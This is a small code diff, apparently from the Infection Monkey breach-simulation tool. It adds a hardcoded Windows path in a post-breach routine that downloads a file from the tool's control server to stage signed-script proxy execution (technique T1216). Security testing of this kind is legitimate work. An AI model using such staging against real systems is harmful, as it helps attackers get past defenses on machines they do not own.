@@ -1,3 +1,4 @@
+import shutil
 import subprocess
 from pathlib import Path
 
@@ -7,6 +8,7 @@ from infection_monkey.control import ControlClient
 def get_windows_commands_to_proxy_execution_using_signed_script():
     # temp_comspec_path = ['infection_monkey', 'post_breach', 'signed_script_proxy', 'windows', 'random_executable.exe']
     # temp_comspec = Path(*temp_comspec_path)
+    temp_comspec = "c:\\Users\\win\\desktop\\t1216.exe"
     with ControlClient.get_T1216_pba_file() as r:
         with open(temp_comspec, 'wb') as f:
             shutil.copyfileobj(r.raw, f)
